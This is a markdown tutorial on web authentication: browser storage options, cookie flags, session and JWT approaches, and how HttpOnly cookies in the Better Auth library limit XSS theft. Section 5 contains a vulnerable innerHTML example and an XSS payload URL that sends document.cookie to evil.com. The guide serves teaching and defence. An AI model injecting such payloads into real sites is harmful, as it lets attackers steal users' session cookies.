# **Web Authentication, Cookies, and XSS: A Complete Guide**

### **1. Overview**

Authentication in web applications often involves **sessions** and **tokens**. The browser stores these credentials in different ways, most commonly as **cookies**.
Security mechanisms like `HttpOnly` cookies exist to prevent attacks such as **Cross-Site Scripting (XSS)**.

---

### **2. Browser Storage Options**

| Storage Type           | Accessible by JavaScript | Sent Automatically with HTTP Requests | Persistent               | Typical Use                                |
| ---------------------- | ------------------------ | ------------------------------------- | ------------------------ | ------------------------------------------ |
| `localStorage`         | ✅ Yes                    | ❌ No                                  | ✅ Until manually cleared | Storing client-only data, like preferences |
| `sessionStorage`       | ✅ Yes                    | ❌ No                                  | ❌ Cleared on tab close   | Temporary UI state                         |
| **Cookies (HttpOnly)** | ❌ No                     | ✅ Yes                                 | ✅ Until expiration       | Authentication and sessions                |

---

### **3. Cookies: How They Work**

Cookies are key-value pairs stored by the browser and sent with every HTTP request to the same domain.

Example:

```
better-auth.session_token=eyJhbGciOiJIUzI1...; Path=/; HttpOnly; SameSite=Lax
```

#### **Key Cookie Flags**

| Flag       | Purpose                                                                                |
| ---------- | -------------------------------------------------------------------------------------- |
| `HttpOnly` | Blocks JavaScript access (`document.cookie` cannot read it). Prevents XSS-based theft. |
| `Secure`   | Cookie only sent over HTTPS.                                                           |
| `SameSite` | Controls cross-origin requests. `Lax` prevents most CSRF attacks.                      |
| `Path`     | Limits cookie to specific routes.                                                      |
| `Domain`   | Restricts cookie to subdomains or specific domains.                                    |

**Why it matters:**
Auth libraries like **Better Auth** use `HttpOnly` + `SameSite=Lax` cookies to protect tokens from client-side access.

---

### **4. Sessions and Tokens**

#### **Session-based authentication**

* The server stores user session info in a **database** (or in-memory store).
* The browser stores a **session token** (e.g., `better-auth.session_token`) in an **HttpOnly cookie**.
* On each request, the browser automatically sends that cookie.
* The backend validates it against the session store.

**Advantage:** Secure, since the token never leaves the browser via JS.
**Disadvantage:** Scaling requires shared session store (e.g., Redis).

#### **Token-based authentication (JWT)**

* The token itself contains authentication data (signed, not encrypted).
* Usually stored in `localStorage` or cookies.
* If stored in `localStorage`, it’s **vulnerable to XSS**.
* Safer if stored in `HttpOnly` cookie.

---

### **5. Cross-Site Scripting (XSS)**

#### **What It Is**

XSS allows an attacker to inject and execute JavaScript in another user’s browser by exploiting unescaped input.

#### **Example**

```js
const name = location.hash;  
document.body.innerHTML = "Hello " + name;
```

URL:

```
https://example.com/#<script>fetch('https://evil.com?cookie='+document.cookie)</script>
```

**Result:**
The attacker’s script runs in the victim’s browser, sending cookies/tokens to the attacker.

---

### **6. Why `HttpOnly` Cookies Stop XSS Theft**

When `HttpOnly` is set:

```js
document.cookie // does not show auth cookies
```

Even if malicious JS runs, it **cannot access** the cookie content.
The browser still attaches it automatically to requests — so the app functions normally.

**Example flow:**

1. User logs in → server sets `HttpOnly` session cookie.
2. JS can’t read or modify it.
3. Browser sends it automatically for `fetch` or page loads to same origin.
4. Attacker can’t steal it even with XSS.

---

### **7. Why Editing Cookies in DevTools Doesn’t Bypass Auth**

DevTools lets you **edit cookies locally**, but:

* The backend validates the token each time.
* Tampered cookies will fail verification (e.g., invalid signature, expired session).
* So changing cookies in browser memory doesn’t grant unauthorized access.

---

### **8. Better Auth’s Behavior**

* Stores session tokens in **secure, `HttpOnly` cookies**.
* Validates every request against a **server-side session store**.
* Rejects manually edited or expired tokens.
* Avoids `localStorage` and `sessionStorage` completely for security.

---

### **9. Security Best Practices**

1. Use **`HttpOnly`** and **`SameSite=Lax`** cookies for auth.
2. Sanitize and escape **all user input**.
3. Avoid `innerHTML`, `eval`, or dynamic script injection.
4. Use **Content Security Policy (CSP)** headers:

   ```
   Content-Security-Policy: default-src 'self';
   ```
5. Serve only over **HTTPS** (`Secure` flag on cookies).
6. Regularly rotate session keys and tokens.

---

### **10. Summary**

| Concept            | Key Point                                            |
| ------------------ | ---------------------------------------------------- |
| **Cookie storage** | Secure and auto-managed by browser                   |
| **HttpOnly flag**  | Protects against XSS-based token theft               |
| **XSS attack**     | Injects malicious JS into your site                  |
| **Better Auth**    | Uses secure session cookies validated on the backend |
| **Tampering**      | Browser edits don’t bypass backend verification      |
a
